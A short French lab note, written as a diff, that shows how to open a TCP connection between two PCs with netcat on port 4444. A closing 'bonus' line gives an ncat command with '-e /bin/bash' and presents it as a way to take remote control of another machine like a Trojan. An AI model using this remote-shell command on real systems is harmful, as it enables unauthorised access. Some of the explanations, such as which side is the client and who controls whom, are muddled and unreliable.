@@ -1,0 +1,16 @@
+utilisation de NetCat pour établir une connection TCP entre deux PC via un commutateur
+
+- démarrage du routeur cisco en premier car elle démarrera plus lentement que les autres machines
+- sur pc 1 : « ip add show dev eth0 »
+> permet de vérifier l’adresse IP du pc1 lié l’interface 0
+> noter l’adresse IP du pc1 de l’eth0 : $IpPc1
+- sur pc1 :  « nc -l -p 4444 »
+> le pc1 en client dans le protocole TCP/UDP va écouter sur le port 4444
+- « netstat -antp »
+> permet de visualiser l’état des ports
+- «  nc $IpPc1 4444 » 
+> permet de monter une connexion à partir de pc2 vers pc1 en TCP depuis le port 4444 : 
+
+
+bonus : «  ncat $IpPc 4444 -e /bin/bash »  permet de prendre le control à distance comme un cheval de troie
+- quand le port 4444 est ouvert sur pc2, si on lance cette commande depuis le pc1 avec l’ip du PC2 à la place de la variable, on prend le contrôle du pc2
